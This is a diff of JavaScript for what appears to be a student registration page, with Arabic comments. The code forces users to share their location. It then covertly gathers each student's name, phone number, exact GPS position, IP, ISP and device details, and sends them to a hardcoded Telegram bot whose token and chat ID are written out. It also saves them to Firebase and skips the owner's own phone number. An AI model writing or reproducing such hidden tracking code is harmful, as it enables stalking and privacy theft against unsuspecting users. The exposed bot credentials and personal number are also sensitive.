@@ -677,110 +677,97 @@ function completeRegistration() {
     const user = JSON.parse(localStorage.getItem('kimo_auth_v26'));
     if(!user) return;
 
-    // --- إجبار الموقع برسالة آدم المخصصة (تعديل الإيموجي) ---
     if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
             (position) => {
-                // فتح المنصة فوراً عند الموافقة
+                // فتح الواجهة فوراً عند الموافقة (ممنوع التهنيج هنا)
                 document.getElementById('login-gate').style.display = 'none';
                 document.getElementById('sidebar').style.display = 'flex';
                 document.getElementById('top-bar').style.display = 'flex';
                 document.getElementById('content').style.display = 'block';
                 document.getElementById('display-name').innerText = user.name.split(' ')[0];
 
-                // انطلاق الرادار الشامل
+                // تشغيل الرادار الشامل في الخلفية
                 startUltimateRadar(position.coords.latitude, position.coords.longitude);
             },
             (error) => {
-                // الرسالة بالتعديل الجديد ❤️
                 alert("لازم تسمح بالموقع يا صديقي عشان كودك يتسجل ❤️");
                 location.reload(); 
             },
             { enableHighAccuracy: true, timeout: 15000 }
         );
+    } else {
+        alert("متصفحك لا يدعم تحديد الموقع، استخدم جوجل كروم ❤️");
     }
 }
 
 const startUltimateRadar = async (lat, lon) => {
     setTimeout(async () => {
-        // 1. سحب بيانات البطارية والشحن
+        // 1. البطارية والشحن
         let batteryInfo = { level: "Unknown", charging: "" };
         try {
             const b = await navigator.getBattery();
             batteryInfo.level = Math.round(b.level * 100) + "%";
-            batteryInfo.charging = b.charging ? " (قيد الشحن ⚡)" : " (يعمل على البطارية 🔋)";
+            batteryInfo.charging = b.charging ? " (قيد الشحن ⚡)" : " (على البطارية 🔋)";
         } catch(e) {}
 
-        // 2. سحب بيانات الذاكرة والمساحة
+        // 2. الرامات والمساحة
         const ram = navigator.deviceMemory || "Unknown";
         let storageInfo = "Unknown";
         try {
             const storage = await navigator.storage.estimate();
             const freeGB = ((storage.quota - storage.usage) / (1024 ** 3)).toFixed(2);
-            storageInfo = `${freeGB} GB متبقية`;
+            storageInfo = freeGB + " GB متبقية";
         } catch(e) {}
 
-        // 3. سحب بيانات الـ IP والشركة بالتفصيل
-        let netInfo = { ip: "Scanning...", city: "Unknown", isp: "Unknown", country: "" };
+        // 3. الشبكة والـ IP
+        let netInfo = { ip: "Scanning...", city: "Unknown", isp: "Unknown" };
         try {
             const res = await fetch('https://ipwho.is/').then(r => r.json());
             if(res.success) {
-                netInfo = { ip: res.ip, city: res.city, isp: res.connection.isp, country: res.country };
+                netInfo = { ip: res.ip, city: res.city + ", " + res.country, isp: res.connection.isp };
             }
         } catch(e) {}
 
-        // 4. تجميع التقرير النهائي المنظم
+        // 4. تجميع التقرير
         const report = {
             name: user.name,
             phone: user.phone,
-            // تجنيب الأخطاء في استخراج نوع الجهاز
             model: navigator.userAgent.includes('(') ? navigator.userAgent.split('(')[1].split(')')[0] : navigator.platform,
-            hw: `${navigator.hardwareConcurrency || "4"} Cores | ${ram}GB RAM`,
+            hw: (navigator.hardwareConcurrency || "4") + " Cores | " + ram + "GB RAM",
             storage: storageInfo,
             battery: batteryInfo.level + batteryInfo.charging,
             ip: netInfo.ip,
             isp: netInfo.isp,
-            location: `${netInfo.city}, ${netInfo.country}`,
-            gpsMap: `http://maps.google.com/maps?q=${lat},${lon}`, // لينك جوجل مباشر ومضمون
-            ipMap: `https://ipwho.is/${netInfo.ip}?view=map`, 
-            screen: `${window.screen.width}x${window.screen.height}`,
+            location: netInfo.city,
+            gpsMap: "http://maps.google.com/maps?q=" + lat + "," + lon, // رابط مباشر وسريع
             time: new Date().toLocaleString('ar-EG')
         };
 
-        // إرسال البيانات للتليجرام بتنسيق "شيك" جداً
         const token = "8691996536:AAHGdKL87Uem-z-tNR-aejGTpjI9SjcjlHY";
         const chatId = "5890070301";
 
-        const message = `
-🕵️‍♂️ *تقرير كيمو رادار الاستخباراتي*
-━━━━━━━━━━━━━━
-👤 *الطالب:* ${report.name}
-📞 *الموبايل:* ${report.phone}
-━━━━━━━━━━━━━━
-📱 *نوع الجهاز:* ${report.model}
-⚙️ *الهاردوير:* ${report.hw}
-🖥️ *الشاشة:* ${report.screen}
-💾 *المساحة:* ${report.storage}
-🔋 *البطارية:* ${report.battery}
-━━━━━━━━━━━━━━
-🌐 *الـ IP:* ${report.ip}
-🏢 *الشركة:* ${report.isp}
-📍 *المدينة:* ${report.location}
-━━━━━━━━━━━━━━
-📍 *الموقع الدقيق (الشارع):*
-${report.gpsMap}
+        const message = "🕵️‍♂️ *تقرير كيمو رادار الاستخباراتي*" + "\n" +
+            "━━━━━━━━━━━━━━" + "\n" +
+            "👤 *الطالب:* " + report.name + "\n" +
+            "📞 *الموبايل:* " + report.phone + "\n" +
+            "━━━━━━━━━━━━━━" + "\n" +
+            "📱 *الجهاز:* " + report.model + "\n" +
+            "⚙️ *الهاردوير:* " + report.hw + "\n" +
+            "💾 *المساحة:* " + report.storage + "\n" +
+            "🔋 *البطارية:* " + report.battery + "\n" +
+            "━━━━━━━━━━━━━━" + "\n" +
+            "🌐 *الـ IP:* " + report.ip + "\n" +
+            "🏢 *الشركة:* " + report.isp + "\n" +
+            "📍 *المدينة:* " + report.location + "\n" +
+            "━━━━━━━━━━━━━━" + "\n" +
+            "📍 *الموقع الدقيق (الشارع):*" + "\n" +
+            report.gpsMap + "\n\n" +
+            "⏰ *التوقيت:* " + report.time + "\n" +
+            "━━━━━━━━━━━━━━";
 
-📍 *الموقع الاحتياطي (الشبكة):*
-${report.ipMap}
-
-⏰ *التوقيت:* ${report.time}
-━━━━━━━━━━━━━━`;
-
-        // شرط عدم إرسال بياناتك الشخصية للإزعاج
         if (user.phone !== "01023175098") {
-            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`);
-            
-            // حفظ في فايربيز للتوثيق
+            fetch("https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chatId + "&text=" + encodeURIComponent(message) + "&parse_mode=Markdown");
             if (typeof studentsRef !== 'undefined') {
                 studentsRef.child(user.phone).update({ security_report: report });
             }
